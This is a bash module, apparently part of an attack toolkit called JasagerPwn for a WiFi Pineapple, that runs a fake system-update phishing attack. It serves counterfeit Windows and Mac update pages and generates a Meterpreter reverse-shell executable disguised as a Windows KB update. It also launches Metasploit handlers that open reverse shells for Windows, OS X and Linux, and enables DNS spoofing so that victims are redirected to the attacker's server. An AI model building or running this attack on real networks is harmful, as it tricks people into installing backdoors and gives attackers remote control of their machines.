#
# Fake Update Attack Module
#
# Author: Leg3nd @ https://leg3nd.me
#

################ Module Configuration ##
# Module Title
title="Fake Update"
# Create a description for menu
description="Fake System Update Phishing"
# Letter keys/commands to select item in menu
bindings="F|f"
#########################################

# Variables
fakeupdate_www="/var/www/fakeupdate"

# Start Function
function start_fakeupdate(){
  echo -e "\e[01;34m[>]\e[00m Running Fake Update Attack..."  
  
  # Clean up 
  echo -e "\e[01;34m[>]\e[00m Setting up the Fake Update website..."
  rm -rf "${fakeupdate_www}/*"
  if [ -e "src/web_templates/fakeupdate-www/windows/en-us/download/Windows-KB896256-v4-x86-ENU.exe" ]; then rm -f "src/web_templates/fakeupdate-www/windows/en-us/download/Windows-KB896256-v4-x86-ENU.exe"; fi
  if [ -e "src/web_templates/fakeupdate-www/mac/en-us/update/Apple_MacOSX_Update.pkg" ]; then rm -f "src/web_templates/fakeupdate-www/mac/en-us/update/Apple_MacOSX_Update.pkg"; fi

  # Copy over new files to server
  if [ ! -d "${fakeupdate_www}" ]; then mkdir "$fakeupdate_www" ; fi
  cp -rf src/web_templates/fakeupdate-www/* "${fakeupdate_www}"

  # Windows Payload choice 
  echo -e "\e[01;34m[>]\e[00m Generating binary payloads..."  
  if [ ! "${windows_payload}" ] || [ ! -e "${windows_payload}" ]; then
      echo -e "\e[01;34m[-]\e[00m Notice: Windows Payload was not found. Defaulting back to metasploit..."
      xterm -geometry 75x15+10+0 -bg black -fg green -T "[JasagerPwn] v${version} - Metasploit (Windows)" -e "msfpayload windows/meterpreter/reverse_tcp LHOST=${our_ip} LPORT=${win_port} R | msfencode -t exe -e x86/shikata_ga_nai -c 10 -o ${fakeupdate_www}/Windows-KB896256-v4-x86-ENU.exe"
  else
    cp -f "${windows_payload}" "src/web_templates/fakeupdate-www/windows/en-us/download/Windows-KB896256-v4-x86-ENU.exe"
  fi

  # Mac Payload choice 
  # We need a .pkg payload for Mac OSX
  if [ ! "${mac_payload}" ] || [ ! -e "${mac_payload}" ]; then
    echo -e "\e[01;31m[!]\e[00m Error: Mac Payload not found and a metasploit payload will not work. Set your payload name in \"mac_payload\": ${mac_payload}"
    sleep 1
  else
    cp -f "${mac_payload}" "src/web_templates/fakeupdate-www/mac/en-us/update/Apple_MacOSX_Update.pkg"
  fi

  # Copy over new files to server
  cp -rf src/web_templates/fakeupdate-www/* "${fakeupdate_www}"
  chown -R www-data:www-data "${fakeupdate_www}" 

  # Setup apache
  echo -e "\e[01;34m[>]\e[00m Setting up Apache server...."  
  echo "<VirtualHost *:80>
          ServerAdmin webmaster@localhost
          DocumentRoot ${fakeupdate_www}
          <Directory />
                  Options FollowSymLinks
                  AllowOverride None
          </Directory>
          <Directory ${fakeupdate_www}>
                  Options Indexes FollowSymLinks MultiViews
                  AllowOverride None
                  Order allow,deny
                  allow from all
          </Directory>
          ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
          <directory \"/usr/lib/cgi-bin\">
                  AllowOverride None
                  Options ExecCGI -MultiViews +SymLinksIfOwnerMatch
                  Order allow,deny
                  Allow from all
          </directory>
          ErrorDocument 403 /index.php
          ErrorDocument 404 /index.php
  </VirtualHost>
  " > /etc/apache2/sites-available/fakeupdate
  
  xterm -geometry 75x8+100+0 -T "[JasagerPwn] v${version} - Starting Apache2" -e "ls /etc/apache2/sites-available/ | xargs a2dissite && a2ensite fakeupdate && a2enmod php5 && /etc/init.d/apache2 reload"
  service apache2 restart > /dev/null 2>&1 &

  # Metasploit resource script
  echo -e "use exploit/multi/handler
  set PAYLOAD windows/meterpreter/reverse_tcp
  set EXITFUNC thread
  set LHOST 0.0.0.0
  set LPORT ${win_port}
  set ExitOnSession false
  set AutoRunScript \"\"
  set InitialAutorunScript multiscript -rc /tmp/autorun.rc
  exploit -j
  set PAYLOAD generic/shell_reverse_tcp
  set LHOST 0.0.0.0
  set LPORT ${osx_port}
  set ExitOnSession false
  set InitialAutorunScript \"\"
  set AutoRunScript \"\"
  exploit -j
  set PAYLOAD linux/x86/shell/reverse_tcp
  set LHOST 0.0.0.0
  set LPORT ${nix_port}
  set ExitOnSession false
  set InitialAutorunScript \"\"
  set AutoRunScript \"\"
  exploit -j
  set PAYLOAD windows/meterpreter/reverse_tcp
  set LHOST 0.0.0.0
  set LPORT ${ps_win_port}
  set InitialAutorunScript \"\"
  set AutoRunScript migrate -f -k
  set ExitOnSession false
  exploit -j
  jobs -v" > /tmp/msfrc
  
  # Start our metasploit listener
  echo -e "\e[01;34m[>]\e[00m Starting metasploit listeners..."  
  terminator -e "msfconsole -r /tmp/msfrc" > /dev/null 2>&1 &
  
  # Set DNSspoof on the pineapple
  echo -e "\e[01;34m[>]\e[00m Enabling dnsspoof on the pineapple.."    
  command="mkdir /pineapple/config ; echo \"${our_ip} *\" > /pineapple/config/spoofhost"
  pineapple_command
  command="bash /pineapple/components/infusions/dnsspoof/includes/autostart.sh"
  pineapple_command
}

# Stop Function
function stop_fakeupdate(){
  echo -e "\e[01;34m[>]\e[00m Stopping Fake Update Attack..."  
  command="killall -9 dnsspoof"
  pineapple_command
}
